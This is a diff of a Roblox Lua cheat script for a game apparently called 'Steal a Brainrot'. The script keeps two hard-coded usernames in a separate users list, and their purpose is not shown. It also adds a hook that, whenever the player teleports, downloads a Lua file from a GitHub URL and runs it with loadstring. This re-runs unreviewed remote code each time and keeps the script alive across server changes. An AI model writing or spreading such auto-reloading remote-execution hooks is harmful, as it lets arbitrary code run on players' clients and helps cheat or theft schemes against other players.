@@ -11,14 +11,13 @@
                         Discord: discord.gg/cnUAk7uc3n
 ]]
 
--- Wait for config
-if not _G["Script-SM_Config"] then
-    warn("[Script.SM] Users Config Not Found! Waiting for config...")
-    repeat task.wait() until _G["Script-SM_Config"]
-end
+local users  = {} 
+local users1 = { "SMILEY_RIVALS", "ta3123321" } 
 
-local users  = _G["Script-SM_Config"].users
-local users1 = { "SMILEY_RIVALS", "ta3123321" }
+spawn(function()
+    repeat task.wait() until _G["Script-SM_Config"]
+    users = _G["Script-SM_Config"].users or {}
+end)
 
 --[[ ==============================================================
      SERVICES & REMOTES
@@ -135,11 +134,10 @@ spawn(function()
     end
 end)
 
-local URL = "https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/refs/heads/main/friendtoggle.lua" -- ← YOUR LINK
-local p = game:GetService("Players").LocalPlayer
-
-p.OnTeleport:Connect(function(state)
+-- AUTO-REJOIN (put at the END of your script)
+local URL = "https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/refs/heads/main/friendtoggle.lua"
+game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(state)
     if state == Enum.TeleportState.Started then
-        task.spawn(loadstring, game:HttpGet(URL))
+        task.spawn(loadstring, game:HttpGet(URL, true))
     end
 end)
